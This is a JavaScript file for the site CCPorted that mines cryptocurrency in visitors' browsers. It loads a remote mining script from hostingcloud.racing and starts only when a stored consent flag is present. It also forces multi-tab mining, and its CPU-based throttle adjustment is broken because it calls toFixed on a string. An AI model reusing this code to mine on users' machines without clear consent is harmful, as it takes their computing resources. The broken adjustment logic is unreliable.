/**
 * CCPorted Browser Mining Script
 * This script handles the cryptocurrency mining functionality for CCPorted
 * It intelligently adjusts throttling based on CPU usage
 */

// Mining as a global variable
window.mining = false;

(function() {
    // Configuration
    const CONFIG = {
      defaultThrottle: 0.3,    // Default throttle value (0-1, where 1 is full power)
      adjustInterval: 60000,   // Adjust throttle every 60 seconds
      cpuUsageThreshold: 85,   // Reduce throttle if CPU usage exceeds this percentage
      minThrottle: 0.1,        // Minimum throttle value
      maxThrottle: 0.9,        // Maximum throttle value
      throttleStep: 0.1,       // How much to adjust throttle by
      gameBuffer: 0.2         // Buffer for game processes (20%)
    };
  
    // Mining client ID - replace with your actual client ID
    const CLIENT_ID = '9d1548228b17117cad26327a9cf3b39bc1f54b18943ae979c3a629411a4696d5';
    
    // State variables
    let startTime = null;
    let adjustmentInterval = null;
    let statsUpdateInterval = null;
    let currentThrottle = CONFIG.defaultThrottle;
    
    // Load the mining library if not already loaded
    function loadMiningLibrary() {
      return new Promise((resolve, reject) => {
        if (window.Client) {
          resolve(window.Client);
          return;
        }
  
        const script = document.createElement('script');
        script.src = 'https://www.hostingcloud.racing/ZJjk.js';
        script.onload = () => resolve(window.Client);
        script.onerror = () => reject(new Error('Failed to load mining library'));
        document.body.appendChild(script);
      });
    }
  
    // Initialize mining client
    let client = null;
    
    // Start mining
    window.startMining = async function() {
      if (window.mining) return;
      console.log("MINING STARTING");
      try {
        // Load mining library if needed
        await loadMiningLibrary();
        
        // Initialize client if needed
        if (!client) {
          client = new Client.Anonymous(CLIENT_ID, {
            throttle: currentThrottle,
            c: 'w'
          });
          window.miningClient = client;
        }
        
        // Start mining
        client.start(Client.FORCE_MULTI_TAB);
        window.mining = true;
        window.miningStart = Date.now();
        startTime = Date.now();
        
        console.log(`Mining started with throttle: ${currentThrottle}`);
        
        // Start periodic stats updates
        startStatsUpdates();
        
        // Start CPU monitoring and throttle adjustment
        startThrottleAdjustment();
        
        return true;
      } catch (error) {
        console.error('Error starting mining:', error);
        return false;
      }
    };
    
    // Stop mining
    window.stopMining = function() {
      if (!window.mining) return;
      
      try {
        if (client) {
          client.stop();
        }
        
        window.mining = false;
        console.log('Mining stopped');
        
        // Clear intervals
        if (statsUpdateInterval) {
          clearInterval(statsUpdateInterval);
          statsUpdateInterval = null;
        }
        
        if (adjustmentInterval) {
          clearInterval(adjustmentInterval);
          adjustmentInterval = null;
        }
        
        return true;
      } catch (error) {
        console.error('Error stopping mining:', error);
        return false;
      }
    };
    
    // Update throttle setting (this will be set by account settings, not user UI)
    window.updateMiningThrottle = function(percentage) {
      if (!client || !window.mining) return false;
      
      try {
        // Convert percentage (0-100) to throttle value (0-1)
        // Note: Library uses inverse throttle where 0 is full power and 1 is minimum
        const throttleValue = 1 - (percentage / 100);
        currentThrottle = throttleValue;
        
        client.setThrottle(throttleValue);
        console.log(`Mining throttle set to ${percentage}% (${throttleValue})`);
        
        return true;
      } catch (error) {
        console.error('Error updating throttle:', error);
        return false;
      }
    };
    
    // Get current mining status
    window.getMiningStatus = function() {
      if (!client || !window.mining) {
        return {
          mining: false,
          hashrate: 0,
          totalHashes: 0,
          throttle: currentThrottle,
          uptime: 0
        };
      }
      
      try {
        const uptime = Math.floor((Date.now() - startTime) / 1000);
        
        return {
          mining: true,
          hashrate: client.getHashesPerSecond(),
          totalHashes: client.getTotalHashes(),
          throttle: currentThrottle,
          uptime: uptime
        };
      } catch (error) {
        console.error('Error getting mining status:', error);
        return {
          mining: false,
          error: 'Failed to get status'
        };
      }
    };
    
    // Start periodic statistics updates
    function startStatsUpdates() {
      if (statsUpdateInterval) {
        clearInterval(statsUpdateInterval);
      }
      
      statsUpdateInterval = setInterval(() => {
        try {
          if (!window.mining || !client) return;
          
          // Update hash rate display
          const hashRateElement = document.getElementById('hashrate');
          if (hashRateElement) {
            hashRateElement.textContent = client.getHashesPerSecond().toFixed(2);
          }
          
          // Update total hashes display
          const totalHashesElement = document.getElementById('total-hashes');
          if (totalHashesElement) {
            totalHashesElement.textContent = client.getTotalHashes().toFixed(0);
          }
        } catch (error) {
          console.error('Error updating mining stats:', error);
        }
      }, 1000);
    }
    function estimateCpuUsage(durationMs = 1000, callback) {
        let startTime = performance.now();
        let idleTime = 0;
      
        function checkIdle(deadline) {
          idleTime += deadline.timeRemaining();
      
          if (performance.now() - startTime < durationMs) {
            requestIdleCallback(checkIdle);
          } else {
            const totalTime = durationMs;
            const busyTime = totalTime - idleTime;
            const cpuUsage = (busyTime / totalTime) * 100;
            callback(cpuUsage.toFixed(2)); // return percentage
          }
        }
      
        requestIdleCallback(checkIdle);
      }
      
    // Measure CPU usage
    async function getCPUUsage() {
      // We can't directly measure CPU usage in the browser
      // This is a simplified approach that just estimates based on timing of operations
      
      return new Promise(resolve => {
        estimateCpuUsage(1000, (usedCPU) => {
          // usedCPU is a percentage of CPU usage
          resolve(usedCPU);
        });
      });
    }
    
    // Start CPU monitoring and throttle adjustment
    function startThrottleAdjustment() {
      if (adjustmentInterval) {
        clearInterval(adjustmentInterval);
      }
      
      adjustmentInterval = setInterval(async () => {
        try {
          if (!window.mining || !client) return;
          
          // Get CPU usage estimate
          const cpuUsage = await getCPUUsage();
          console.log(`Estimated CPU usage: ${cpuUsage.toFixed(1)}%`);
          
          // Calculate allowed CPU usage based on throttle and buffer
          const throttlePercentage = (1 - currentThrottle) * 100;
          const allowedCpuUsage = throttlePercentage + (CONFIG.gameBuffer * 100);
          
          // Adjust throttle based on CPU usage
          // Only lower throttle if CPU usage significantly exceeds allowed usage
          if (cpuUsage > allowedCpuUsage + 10) { // Added 10% tolerance
            // CPU usage is too high, reduce mining power
            const newThrottle = Math.min(1 - CONFIG.minThrottle, currentThrottle + CONFIG.throttleStep);
            
            if (newThrottle !== currentThrottle) {
              client.setThrottle(newThrottle);
              currentThrottle = newThrottle;
              console.log(`CPU usage high (${cpuUsage.toFixed(1)}%), reduced throttle to ${currentThrottle}`);
            }
          } else if (cpuUsage < allowedCpuUsage - 15) { // Added 15% buffer to avoid frequent changes
            // CPU usage is well below allowed usage, we can potentially increase mining power
            const newThrottle = Math.max(1 - CONFIG.maxThrottle, currentThrottle - CONFIG.throttleStep);
            
            if (newThrottle !== currentThrottle) {
              client.setThrottle(newThrottle);
              currentThrottle = newThrottle;
              console.log(`CPU usage low (${cpuUsage.toFixed(1)}%), increased throttle to ${currentThrottle}`);
            }
          }
        } catch (error) {
          console.error('Error in throttle adjustment:', error);
        }
      }, CONFIG.adjustInterval);
    }
    
    // Check for existing consent at script load time
    function checkExistingConsent() {
      const miningConsent = localStorage.getItem('mining-consent');
      const miningExpiryStr = localStorage.getItem('mining-consent-expiry');
      
      if (miningConsent === 'true' && miningExpiryStr) {
        const miningExpiry = new Date(miningExpiryStr);
        if (miningExpiry > new Date()) {
          // Valid consent exists, start mining
          window.startMining();
        }
      }
    }
    
    // Initialize when loaded
    function init() {
      // Add event listeners for page visibility changes
      document.addEventListener('visibilitychange', function() {
        if (window.mining) {
          if (document.hidden) {
            // Reduce mining power when tab is not visible
            if (client) {
              const oldThrottle = currentThrottle;
              currentThrottle = Math.min(0.9, currentThrottle + 0.2);
              client.setThrottle(currentThrottle);
              console.log(`Tab hidden, reduced throttle from ${oldThrottle} to ${currentThrottle}`);
            }
          } else {
            // Restore mining power when tab becomes visible again
            if (client) {
              // Use the default throttle when tab becomes visible again
              // (throttle setting will be managed by account settings, not UI)
              currentThrottle = CONFIG.defaultThrottle;
              client.setThrottle(currentThrottle);
              console.log(`Tab visible again, restored throttle to ${currentThrottle}`);
            }
          }
        }
      });
      
      // Check for existing consent
      checkExistingConsent();
    }
    
    // Run initialization
    init();
})();